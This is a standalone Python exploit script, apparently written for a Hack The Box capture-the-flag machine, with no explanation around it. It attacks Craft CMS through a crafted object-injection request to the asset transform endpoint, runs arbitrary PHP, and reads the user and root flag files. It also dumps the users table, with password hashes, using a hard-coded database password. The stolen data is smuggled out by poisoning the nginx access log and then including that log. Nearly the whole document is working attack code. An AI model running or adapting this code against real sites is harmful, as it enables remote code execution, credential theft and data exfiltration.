import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":item_file}]}}}
    headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

# PHP code: read flags/DB, store in file, make loopback request with data
php = (
    '<?php '
    '$uf = @file_get_contents("/home/adam/user.txt"); '
    '$rf = @file_get_contents("/root/root.txt"); '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $ud = json_encode($us); '
    '} catch (Exception $e) { $ud = "DBERR:" . $e->getMessage(); } '
    '$data = "UF=" . urlencode(trim($uf ?: "NOUF")) . "&RF=" . urlencode(trim($rf ?: "NORF")) . "&UD=" . urlencode($ud); '
    '# Make loopback request with timeout to avoid deadlock '
    '$ctx = stream_context_create(["http" => ["timeout" => 5, "method" => "GET"]]); '
    '$resp = @file_get_contents("http://127.0.0.1/index.php?p=admin/login&$data", false, $ctx); '
    '# Also make a direct request to root URL with data '
    '$resp2 = @file_get_contents("http://127.0.0.1/$data", false, $ctx); '
    '# Log what happened '
    'file_put_contents("/dev/shm/lb_result.txt", "DONE:" . ($resp !== false ? strlen($resp) : "FAIL") . "|" . ($resp2 !== false ? strlen($resp2) : "FAIL2")); '
    '?>'
)

print("[*] Making loopback request with data ...")
r = inject_b64(php)
print(f"    Status: {r.status_code}")
time.sleep(3)

# Touch access.log and read it
php_touch = '<?php @touch("/var/log/nginx/access.log"); @opcache_invalidate("/var/log/nginx/access.log", true); ?>'
r = inject_b64(php_touch)
time.sleep(1)

# Include access.log
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/log/nginx/access.log"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

# Search for exfil data in access.log
for kw in ['UF=', 'RF=', 'UD=', 'NOUF', 'NORF', 'DBERR', 'HTB{', 'flag{']:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] FOUND "{kw}" at byte {idx}')
        print(f'    Data: {t[idx:idx+400]}')
    else:
        print(f'[-] "{kw}" not found')

# Also search the entire response for URL-encoded patterns
urlencoded = re.findall(r'UF=[^&\s]+', t)
if urlencoded:
    print(f'\n[+] URL-encoded UF values: {urlencoded[:5]}')
urlencoded2 = re.findall(r'RF=[^&\s]+', t)
if urlencoded2:
    print(f'[+] URL-encoded RF values: {urlencoded2[:5]}')

# Print the last entries of access.log
trace_idx = t.find('#0 /var/www')
if trace_idx > 0:
    log_section = t[:trace_idx]
    print(f'\n--- Access.log NEWEST entries ---')
    lines = [l for l in log_section.split('\n') if l.strip()]
    for line in lines[-15:]:
        print(line[:200])
PYEOF